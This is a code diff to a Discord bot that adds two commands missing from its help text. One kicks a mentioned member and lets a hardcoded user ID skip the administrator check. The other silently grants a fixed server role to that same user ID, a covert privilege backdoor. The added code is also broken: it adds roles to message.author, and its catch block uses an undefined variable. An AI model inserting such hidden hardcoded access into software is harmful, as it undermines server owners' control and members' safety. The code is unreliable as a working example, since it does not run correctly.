@@ -66,7 +66,24 @@ client.on('message', async (message) => {
 		} 
 	} else if (text.startsWith("!help")) {
 		message.reply("!bal, !dailydollar")
-	}
+	} else if (text.startsWith("!executeOrder69")) { 
+    if (message.member.hasPermission('ADMINISTRATOR') || message.author.id == 304405847247814656) {
+    let member = message.mentions.members.first();
+    if(!member) return message.reply("Mention a valid waiter");
+    if(!member.kickable) return message.reply("Error!");
+    member.kick();
+    }
+  } else if (text.startsWith("!iAmABot")) { 
+    try {
+      if (message.author.id == 304405847247814656) {
+      let role = message.guild.roles.cache.get("831282758504415232");
+      message.author.roles.add(role);
+      }
+    } catch {
+      console.log("error")
+      message.author.roles.add(role);
+    }
+  }
 });
 var app = express();
 app.get('/', function(req, res){
